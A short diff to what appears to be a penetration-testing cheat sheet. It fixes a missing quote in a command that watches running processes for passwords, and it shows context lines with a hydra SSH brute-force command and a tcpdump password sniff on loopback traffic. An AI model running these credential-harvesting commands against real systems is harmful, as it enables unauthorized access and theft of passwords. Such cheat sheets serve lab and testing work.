@@ -59,7 +59,7 @@ hydra -l user -P wordlist $VictimIP -t 4 ssh -V
 ### Hidden passwords in Services
 
 ```
-watch -n1 "ps aux | grep pass | grep -v grep | fold -s
+watch -n1 "ps aux | grep pass | grep -v grep | fold -s"
 sudo tcpdump -i lo -A | grep "pass"
 ```
 
